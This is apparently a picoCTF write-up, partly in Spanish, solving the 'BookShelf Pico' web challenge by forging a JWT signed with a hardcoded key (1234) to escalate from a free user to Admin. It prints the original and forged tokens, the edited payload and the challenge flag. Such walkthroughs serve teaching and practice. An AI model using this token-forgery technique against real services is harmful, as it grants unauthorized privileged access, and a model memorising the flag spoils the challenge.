BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!
Additional details will be available after launching your challenge instance.
_______
## Hints
* Maybe try to find the JWT Signing Key ("secret key") in the source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?
* The 'role' and 'userId' fields in the JWT can be of interest to you!
* The 'controllers', 'services' and 'security' java packages in the given source code might need your attention. We've provided a README.md file that contains some documentation.
* Upgrade your 'role' with the _new_ (cracked) JWT. And re-login for the new role to get reflected in browser's localStorage.
____________
## Solución
Ingresar a la página
User: user
Password: user

Nos proporciona 3 libros, el que nos interesa es el que dice flag, que en estos momentos no podemos acceder por que no estamos como administradores.
A través de la  manipulación de tokens JWT accederemos como rol de administrador.

Le damos inspeccionar

Storage->Local Storage->http://saturn.picoctf.net:60488 ->auth-token

Copiamos el valorde auth-token: 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc0NTM3NTE4MywiaWF0IjoxNzQ0NzcwMzgzLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.MIqQxkfvm8klHOjTtBziF3WOID6BaBOppl2swfiTu44

Checando los archivos de código vemos que la **SECRET_KEY** es 1234

Utilizamos el sitio web https://supertokens.com/jwt-encoder-decoder# para decodificar y codificar tokens JWT.

Pegamos:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc0NTM3NTE4MywiaWF0IjoxNzQ0NzcwMzgzLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.MIqQxkfvm8klHOjTtBziF3WOID6BaBOppl2swfiTu44

Y modificamos; en role con el valor Admin, userId con el valor 2 y email con el vamor admin: 
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1745375183,
  "iat": 1744770383,
  "userId": 2,
  "email": "admin"
}

Y en signing key agregamos la llave que es 1234, quedando:
HMACSHA256( 
    base64UrlEncode(header) + "." +
    base64UrlEncode(payload),
	1234
)

Copiamos el token que se generó.
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDUzNzUxODMsImlhdCI6MTc0NDc3MDM4MywidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.iRIzl6SW4b7ZebYxueP9CU3B8tgqViix5EBLYCpLC0c

Regresamos a la página en donde se estaba inspeccionando  y en auth-token pegamos el nuevo token.
En token-payload modificamos, en role con el valor Admin, userId con el valor 2 y email con el vamor admin, quedando: 
{"role":"Admin","iss":"bookshelf","exp":1745375183,"iat":1744770383,"userId":2,"email":"admin"}

Recargamos la pagina y sale la bandera:

Great job! Here’s your flag:
picoCTF{w34k_jwt_n0t_g00d_d72df65e}
